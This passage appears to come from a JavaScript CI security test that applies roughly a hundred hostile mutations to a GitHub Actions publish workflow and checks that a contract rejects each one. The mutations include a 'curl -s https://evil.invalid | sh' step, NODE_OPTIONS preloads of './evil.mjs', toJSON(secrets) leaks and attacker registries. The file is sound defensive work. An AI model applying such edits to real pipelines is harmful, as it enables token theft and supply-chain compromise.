  ["upload checks out the whole workspace", edit((j) => { delete j.upload.steps[0].with["sparse-checkout"]; })],
  ["upload loses its environment", edit((j) => { delete j.upload.environment; })],
  ["upload loses id-token", edit((j) => { j.upload.permissions = { contents: "read" }; })],
  ["upload runs even after failures", edit((j) => { j.upload.if = "${{ always() }}"; })],
  ["upload no longer needs a real publish", edit((j) => { j.upload.if = "${{ github.ref == 'refs/heads/main' }}"; })],
  ["upload no longer needs main", edit((j) => { j.upload.if = "${{ needs.plan.outputs.dry_run == 'false' }}"; })],
  ["one upload step reads both tokens", edit((j) => { const s = j.upload.steps.find((x) => x.env?.NODE_AUTH_TOKEN); s.env.CARGO_REGISTRY_TOKEN = "${{ secrets.CARGO_REGISTRY_TOKEN }}"; })],
  ["a token step runs for either registry", edit((j) => { delete j.upload.steps.find((x) => x.env?.NODE_AUTH_TOKEN).if; })],
  ["the npm token comes from another secret", edit((j) => { j.upload.steps.find((x) => x.env?.NODE_AUTH_TOKEN).env.NODE_AUTH_TOKEN = "${{ secrets.OTHER }}"; })],
  ["top-level permissions widen", edit((_, d) => { d.permissions = { contents: "write" }; })],
  ["a push trigger appears", edit((_, d) => { d.on.push = { branches: ["main"] }; })],
  ["pull_request_target appears", edit((_, d) => { d.on.pull_request_target = {}; })],
  ["an action is unpinned", edit((j) => { j.verify.steps[0].uses = "actions/checkout@v7"; })],
  ["a checkout keeps credentials", edit((j) => { j.verify.steps[0].with["persist-credentials"] = "true"; })],
  ["an input is interpolated into a script", edit((j) => { j.verify.steps.at(-3).run = 'echo "${{ inputs.units }}"'; })],
  ["plan stops running the contract", edit((j) => { j.plan.steps = j.plan.steps.filter((s) => !/workflow-contract/.test(s.run ?? "")); })],
  ["verify skips the unit gate", edit((j) => { j.verify.steps = j.verify.steps.filter((s) => !/gate\.mjs/.test(s.run ?? "")); })],
  ["verify skips the receipt", edit((j) => { j.verify.steps = j.verify.steps.filter((s) => !/publish\.mjs verify/.test(s.run ?? "")); })],
  ["verify may be skipped by a condition", edit((j) => { j.verify.if = "${{ always() }}"; })],
  ["a job has no timeout", edit((j) => { delete j.pack["timeout-minutes"]; })],
  // Condition and secret-expression bypasses (each is valid GitHub expression syntax).
  ["upload condition gains || true after the expression", edit((j) => { j.upload.if = `${j.upload.if} || true`; })],
  ["upload condition gains || true inside the expression", edit((j) => { j.upload.if = j.upload.if.replace(" }}", " || true }}"); })],
  ["upload condition is wrapped in a negation", edit((j) => { j.upload.if = j.upload.if.replace("${{ ", "${{ !(!(").replace(" }}", ")) }}"); })],
  ["upload condition drops the count test", edit((j) => { j.upload.if = "${{ needs.plan.outputs.dry_run == 'false' && github.ref == 'refs/heads/main' }}"; })],
  ["a token step condition gains || true", edit((j) => { const s = j.upload.steps.find((x) => x.env?.NODE_AUTH_TOKEN); s.if = s.if.replace(" }}", " || true }}"); })],
  ["the receipt step gains a condition other than always()", edit((j) => { j.upload.steps.at(-1).if = "${{ success() }}"; })],
  ["an upload checkout is conditional", edit((j) => { j.upload.steps[0].if = "${{ false }}"; })],
  ["pack reads a bracket-form secret", edit((j) => { j.pack.steps.at(-2).env = { ...(j.pack.steps.at(-2).env ?? {}), T: "${{ secrets['CARGO_REGISTRY_TOKEN'] }}" }; })],
  ["verify reads a double-quoted bracket-form secret", edit((j) => { j.verify.steps.at(-3).env = { ...(j.verify.steps.at(-3).env ?? {}), T: '${{ secrets["CARGO_REGISTRY_TOKEN"] }}' }; })],
  ["verify reads toJSON(secrets)", edit((j) => { j.verify.steps.at(-3).env = { ...(j.verify.steps.at(-3).env ?? {}), ALL: "${{ toJSON(secrets) }}" }; })],
  ["pack reads the bare secrets context", edit((j) => { j.pack.steps.at(-2).env = { ...(j.pack.steps.at(-2).env ?? {}), ALL: "${{ secrets }}" }; })],
  ["seal-check reads a mixed-case secret", edit((j) => { j["seal-check"].steps.find((s) => s.run).env.T = "${{ Secrets.NPM_TOKEN }}"; })],
  ["a verify step condition reads a secret", edit((j) => { j.verify.steps[1].if = "${{ secrets.NPM_TOKEN != '' }}"; })],
  ["a verify checkout takes a secret as with.token", edit((j) => { j.verify.steps[0].with.token = "${{ secrets.NPM_TOKEN }}"; })],
  ["plan calls secrets: inherit", edit((j) => { j.plan.secrets = "inherit"; })],
  ["a job calls a reusable workflow", edit((j) => { j.pack.uses = "./.github/workflows/other.yml"; })],
  ["workflow-level env holds a secret", edit((_, d) => { d.env = { T: "${{ secrets.NPM_TOKEN }}" }; })],
  ["a job-level env holds a secret", edit((j) => { j["seal-check"].env = { T: "${{ secrets.NPM_TOKEN }}" }; })],
  ["the npm token step reads a bracket-form secret", edit((j) => { j.upload.steps.find((x) => x.env?.NODE_AUTH_TOKEN).env.NODE_AUTH_TOKEN = "${{ secrets['NPM_TOKEN'] }}"; })],
  ["an upload step reads toJSON(secrets)", edit((j) => { j.upload.steps.splice(2, 0, { name: "leak", env: { ALL: "${{ toJSON(secrets) }}" } }); })],
  ["the download step takes a secret token", edit((j) => { j.upload.steps.find((x) => /download-artifact/.test(x.uses ?? "")).with["github-token"] = "${{ secrets.NPM_TOKEN }}"; })],
  ["seal-check runs the uploader without --dry-run after the dry run", edit((j) => { const s = j["seal-check"].steps.find((x) => x.run); s.run = `${s.run.trim()} || node scripts/ci/upload.mjs run`; })],
  ["seal-check dry run is conditional", edit((j) => { j["seal-check"].steps.find((x) => x.run).if = "${{ false }}"; })],
  ["seal-check adds a second run step", edit((j) => { j["seal-check"].steps.push({ name: "extra", run: "echo hi" }); })],
  ["seal-check uses an unlisted action", edit((j) => { j["seal-check"].steps.splice(2, 0, actionStep("pnpm/action-setup@0977fd99725f1db4007ccb2928dbb4e90d06cc86")); })],
  ["the Chrome pin step is told it is always a dry run", edit((j) => { j.verify.steps.find((x) => /provision-chrome/.test(x.run ?? "")).env.PUBLISH_DRY_RUN = "true"; })],
  ["the Chrome pin step loses its dry-run flag", edit((j) => { delete j.verify.steps.find((x) => /provision-chrome/.test(x.run ?? "")).env.PUBLISH_DRY_RUN; })],
  // The privileged job is closed (audit finding 18): environment, step keys, `with` keys, step list and job keys.
  ["the npm step gains NODE_OPTIONS (a preload runs with the token)", edit((j) => { j.upload.steps[5].env.NODE_OPTIONS = "--import=./evil.mjs"; })],
  ["the crates step gains NODE_OPTIONS", edit((j) => { j.upload.steps[6].env.NODE_OPTIONS = "--require ./evil.cjs"; })],
  ["the npm step gains NPM_CONFIG_SCRIPT_SHELL", edit((j) => { j.upload.steps[5].env.NPM_CONFIG_SCRIPT_SHELL = "/tmp/sh"; })],
  ["the npm step gains a lower-case npm_config_ key", edit((j) => { j.upload.steps[5].env.npm_config_registry = "https://evil.invalid/"; })],
  ["the crates step gains a *_OPTIONS key", edit((j) => { j.upload.steps[6].env.JAVA_TOOL_OPTIONS = "-javaagent:x.jar"; })],
  ["the npm step gains PATH", edit((j) => { j.upload.steps[5].env.PATH = "/tmp/bin"; })],
  ["the npm step gains a key outside the allow-list", edit((j) => { j.upload.steps[5].env.EXTRA = "1"; })],
  ["the npm step loses a PUBLISH_ key", edit((j) => { delete j.upload.steps[5].env.PUBLISH_ALLOW_NO_TEST; })],
  ["a PUBLISH_ key is rebound to a literal", edit((j) => { j.upload.steps[5].env.PUBLISH_UNITS = "@rightkit/anything"; })],
  ["the checkout step gains an env block", edit((j) => { j.upload.steps[0].env = { NODE_OPTIONS: "--import=./evil.mjs" }; })],
  ["the setup-node step gains PATH", edit((j) => { j.upload.steps[1].env = { PATH: "/tmp/bin" }; })],
  ["a download step gains an env block", edit((j) => { j.upload.steps[2].env = { X: "1" }; })],
  ["the receipt upload gains an env block", edit((j) => { j.upload.steps[7].env = { NODE_OPTIONS: "--import=./evil.mjs" }; })],
  ["the npm step overrides the shell", edit((j) => { j.upload.steps[5].shell = "bash -c 'node --import ./evil.mjs {0}'"; })],
  ["the crates step overrides the shell", edit((j) => { j.upload.steps[6].shell = "pwsh"; })],
  ["the npm step changes its working directory", edit((j) => { j.upload.steps[5]["working-directory"] = "${{ runner.temp }}/sealed/packed"; })],
  ["a step gains an id", edit((j) => { j.upload.steps[5].id = "publish"; })],
  ["a step gains its own timeout", edit((j) => { j.upload.steps[5]["timeout-minutes"] = 1; })],
  ["a run step gains a with block", edit((j) => { j.upload.steps[5].with = { x: "1" }; })],
  ["an extra upload step repeats the uploader", edit((j) => { j.upload.steps.splice(7, 0, { name: "again", run: "node scripts/ci/upload.mjs run" }); })],
  ["an extra upload step appends a checkout", edit((j) => { j.upload.steps.push({ uses: j.upload.steps[0].uses, with: { ...j.upload.steps[0].with } }); })],
  ["an upload step is removed", edit((j) => { j.upload.steps.splice(4, 1); })],
  ["upload steps are reordered", edit((j) => { const [x] = j.upload.steps.splice(5, 1); j.upload.steps.splice(2, 0, x); })],
  ["the checkout gains a ref", edit((j) => { j.upload.steps[0].with.ref = "refs/heads/other"; })],
  ["the checkout gains a repository", edit((j) => { j.upload.steps[0].with.repository = "someone/else"; })],
  ["the checkout drops sparse-checkout-cone-mode", edit((j) => { delete j.upload.steps[0].with["sparse-checkout-cone-mode"]; })],
  ["setup-node gains a cache", edit((j) => { j.upload.steps[1].with.cache = "npm"; })],
  ["setup-node gains a registry-url", edit((j) => { j.upload.steps[1].with["registry-url"] = "https://evil.invalid/"; })],
  ["setup-node drops package-manager-cache", edit((j) => { delete j.upload.steps[1].with["package-manager-cache"]; })],
  ["a download takes another run id", edit((j) => { j.upload.steps[2].with["run-id"] = "1"; })],
  ["a download takes another repository", edit((j) => { j.upload.steps[3].with.repository = "someone/else"; })],
  ["a download merges into another path", edit((j) => { j.upload.steps[4].with["merge-multiple"] = "true"; })],
  ["the packed download reads another artifact", edit((j) => { j.upload.steps[2].with.name = "other"; })],
  ["the previous-receipt download reads a wider pattern", edit((j) => { j.upload.steps[4].with.pattern = "*"; })],
  ["the previous-receipt download writes into the sealed bytes", edit((j) => { j.upload.steps[4].with.path = "${{ runner.temp }}/sealed/packed"; })],
  ["the receipt upload gains a second path", edit((j) => { j.upload.steps[7].with.path = "${{ runner.temp }}/publication-receipt\n${{ runner.temp }}/sealed"; })],
  ["the receipt upload drops overwrite", edit((j) => { delete j.upload.steps[7].with.overwrite; })],
  ["upload gains defaults", edit((j) => { j.upload.defaults = { run: { shell: "bash", "working-directory": "/tmp" } }; })],
  ["upload gains job-level NODE_OPTIONS", edit((j) => { j.upload.env = { NODE_OPTIONS: "--import=./evil.mjs" }; })],
  ["upload gains a container", edit((j) => { j.upload.container = "evil.invalid/image:latest"; })],
  ["upload gains services", edit((j) => { j.upload.services = { db: { image: "evil.invalid/db" } }; })],
  ["upload gains a strategy", edit((j) => { j.upload.strategy = { matrix: { x: [1] } }; })],
  ["upload gains job outputs", edit((j) => { j.upload.outputs = { x: "${{ steps.a.outputs.b }}" }; })],
  ["upload gains a concurrency group", edit((j) => { j.upload.concurrency = "x"; })],
  ["upload gains a display name that is a key outside the list", edit((j) => { j.upload["runs-on-labels"] = ["self-hosted"]; })],
  // sign-swap and the secretless pack.
  ["the signing secret leaks into pack", edit((j) => { j.pack.steps.at(-2).env = { ...(j.pack.steps.at(-2).env ?? {}), APPLE_CERTIFICATE_BASE64: "${{ secrets.APPLE_CERTIFICATE_BASE64 }}" }; })],
  ["pack joins the release environment", edit((j) => { j.pack.environment = "release"; })],
  ["pack builds the swap itself", edit((j) => { j.pack.steps.splice(-1, 0, { name: "build swap", run: "cargo build --release -p rightkit-fs --bin rightkit-swap" }); })],
  ["pack signs the swap itself", edit((j) => { j.pack.steps.splice(-1, 0, { name: "sign", run: "codesign --force --sign - packages/release/bin/darwin/rightkit-swap" }); })],
  ["pack downloads the swap from another run", edit((j) => { j.pack.steps.find((s) => s.with?.name === SIGN_SWAP_ARTIFACT).with["run-id"] = "1"; })],
  ["pack downloads the swap with a token", edit((j) => { j.pack.steps.find((s) => s.with?.name === SIGN_SWAP_ARTIFACT).with["github-token"] = "${{ secrets.NPM_TOKEN }}"; })],
  ["pack stops re-checking the swap hash", edit((j) => { const s = j.pack.steps.find((x) => /install -m 0755/.test(x.run ?? "")); s.run = s.run.replace("sha256sum -c", "true"); })],
  ["pack places the swap after packing", edit((j) => { const i = j.pack.steps.findIndex((x) => /install -m 0755/.test(x.run ?? "")); const [x] = j.pack.steps.splice(i, 1); j.pack.steps.splice(-1, 0, x); })],
  ["pack no longer needs sign-swap", edit((j) => { j.pack.needs = j.pack.needs.filter((n) => n !== "sign-swap"); })],
  ["pack runs after a failed sign-swap", edit((j) => { j.pack.if = j.pack.if.replace(" && (needs.sign-swap.result == 'success' || needs.sign-swap.result == 'skipped')", ""); })],
  ["pack no longer needs a green plan", edit((j) => { j.pack.if = j.pack.if.replace("needs.plan.result == 'success' && ", ""); })],
  ["sign-swap reads the npm token", edit((j) => { j["sign-swap"].steps.find((s) => s.env?.APPLE_CERTIFICATE_BASE64).env.NODE_AUTH_TOKEN = "${{ secrets.NPM_TOKEN }}"; })],
  ["sign-swap reads a secret in a second step", edit((j) => { j["sign-swap"].steps.find((s) => /codesign --force/.test(s.run ?? "")).env.X = "${{ secrets.APPLE_KEYCHAIN_PASSWORD }}"; })],
  ["the swap build step gets a secret", edit((j) => { j["sign-swap"].steps.find((s) => /cargo build /.test(s.run ?? "")).env = { T: "${{ secrets.APPLE_CERTIFICATE_PASSWORD }}" }; })],
  ["sign-swap builds after the secret step", edit((j) => { const i = j["sign-swap"].steps.findIndex((s) => /cargo build /.test(s.run ?? "")); const [x] = j["sign-swap"].steps.splice(i, 1); const k = j["sign-swap"].steps.findIndex((s) => s.env?.APPLE_CERTIFICATE_BASE64); j["sign-swap"].steps.splice(k + 1, 0, x); })],
  ["sign-swap requests id-token", edit((j) => { j["sign-swap"].permissions = { contents: "read", "id-token": "write" }; })],
  ["sign-swap loses its environment", edit((j) => { delete j["sign-swap"].environment; })],
  ["sign-swap runs on another host", edit((j) => { j["sign-swap"]["runs-on"] = "ubuntu-24.04"; })],
  ["sign-swap runs for crates runs too", edit((j) => { j["sign-swap"].if = "${{ needs.plan.outputs.count != '0' }}"; })],
  ["sign-swap uses another identity", edit((j) => { j["sign-swap"].steps.find((s) => /codesign --force/.test(s.run ?? "")).env.APPLE_DEVELOPER_ID = "-"; })],
  ["sign-swap drops the hardened runtime", edit((j) => { const s = j["sign-swap"].steps.find((x) => /codesign --force/.test(x.run ?? "")); s.run = s.run.replace(" --options runtime", ""); })],
  ["sign-swap keeps the keychain", edit((j) => { j["sign-swap"].steps = j["sign-swap"].steps.filter((s) => !/security delete-keychain/.test(s.run ?? "")); })],
  ["sign-swap uses an unlisted action", edit((j) => { j["sign-swap"].steps.splice(2, 0, actionStep("pnpm/action-setup@0977fd99725f1db4007ccb2928dbb4e90d06cc86")); })],
  ["sign-swap hands over another path", edit((j) => { j["sign-swap"].steps.find((s) => /upload-artifact/.test(s.uses ?? "")).with.path = "target"; })],
  ["sign-swap secret step runs downloaded code", edit((j) => { j["sign-swap"].steps.find((s) => s.env?.APPLE_CERTIFICATE_BASE64).run += "\ncurl -s https://evil.invalid | sh"; })],
  // The licence gate (rightkit#264).
  ["the deny gate is removed", edit((j) => { j.plan.steps = j.plan.steps.filter((s) => !/cargo deny/.test(s.run ?? "")); })],
  ["the deny install is removed", edit((j) => { j.plan.steps = j.plan.steps.filter((s) => !(s.uses ?? "").startsWith("taiki-e/install-action@")); })],
  ["deny runs after upload", edit((j) => { const i = j.plan.steps.findIndex((s) => /cargo deny/.test(s.run ?? "")); const [x] = j.plan.steps.splice(i, 1); j.upload.steps.push(x); })],
  ["deny moves to pack", edit((j) => { const i = j.plan.steps.findIndex((s) => /cargo deny/.test(s.run ?? "")); const [x] = j.plan.steps.splice(i, 1); j.pack.steps.push(x); })],
  ["deny runs before the plan step", edit((j) => { const i = j.plan.steps.findIndex((s) => /cargo deny/.test(s.run ?? "")); const [x] = j.plan.steps.splice(i, 1); j.plan.steps.splice(0, 0, x); })],
  ["the deny gate also runs for npm", edit((j) => { j.plan.steps.find((s) => /cargo deny/.test(s.run ?? "")).if = "${{ contains(steps.plan.outputs.units, 'rightkit-typeset') }}"; })],
  ["the deny gate ignores rightkit-typeset", edit((j) => { j.plan.steps.find((s) => /cargo deny/.test(s.run ?? "")).if = "${{ inputs.registry == 'npm' }}"; })],
  ["the deny gate is made non-fatal", edit((j) => { const s = j.plan.steps.find((x) => /cargo deny/.test(x.run ?? "")); s.run = `${s.run} || true`; })],
  ["the deny gate checks another crate", edit((j) => { const s = j.plan.steps.find((x) => /cargo deny/.test(x.run ?? "")); s.run = s.run.replace("rightkit-typeset", "rightkit-fs"); })],
  ["the deny gate checks advisories not licences", edit((j) => { const s = j.plan.steps.find((x) => /cargo deny/.test(x.run ?? "")); s.run = s.run.replace(" licenses", " advisories"); })],
  ["the deny checker is unpinned", edit((j) => { j.plan.steps.find((s) => (s.uses ?? "").startsWith("taiki-e/install-action@")).uses = "taiki-e/install-action@v2"; })],
  ["the deny checker version floats", edit((j) => { j.plan.steps.find((s) => (s.uses ?? "").startsWith("taiki-e/install-action@")).with.tool = "cargo-deny"; })],
  ["the deny install gains a token", edit((j) => { j.plan.steps.find((s) => (s.uses ?? "").startsWith("taiki-e/install-action@")).with.token = "${{ secrets.NPM_TOKEN }}"; })],
  ["plan uses an unlisted action", edit((j) => { j.plan.steps.push(actionStep("pnpm/action-setup@0977fd99725f1db4007ccb2928dbb4e90d06cc86")); })],
  ["plan's dry_run output is rewritten", edit((j) => { j.plan.outputs.dry_run = "false"; })],
];

/** Returns the names of mutations the contract failed to reject (empty when every one is caught). */
export function proveMutations(doc) {
  assertPublishDoc(doc);
  const survivors = [];
  for (const [name, mutate] of MUTATIONS) {
    const copy = structuredClone(doc);
    try { mutate(copy); } catch (error) { throw new Error(`mutation "${name}" could not be applied: ${error.message}`); }
    try { assertPublishDoc(copy); survivors.push(name); } catch { /* rejected, as required */ }
  }
  return survivors;
}

if (process.argv[1] && fs.realpathSync(process.argv[1]) === fs.realpathSync(fileURLToPath(import.meta.url))) {
  const file = process.argv[2];
  if (!file) { process.stderr.write("usage: workflow-contract.mjs <publish.yml>\n"); process.exit(2); }
  try {
    const doc = parseYaml(fs.readFileSync(file, "utf8"));
    assertPublishDoc(doc, file);
    const survivors = proveMutations(doc);
    if (survivors.length) throw new Error(`the contract accepts these violations: ${survivors.join("; ")}`);
    process.stdout.write(`${file}: publish contract holds; ${MUTATIONS.length} mutations rejected\n`);
  } catch (error) { process.stderr.write(`${error.message}\n`); process.exit(1); }
}
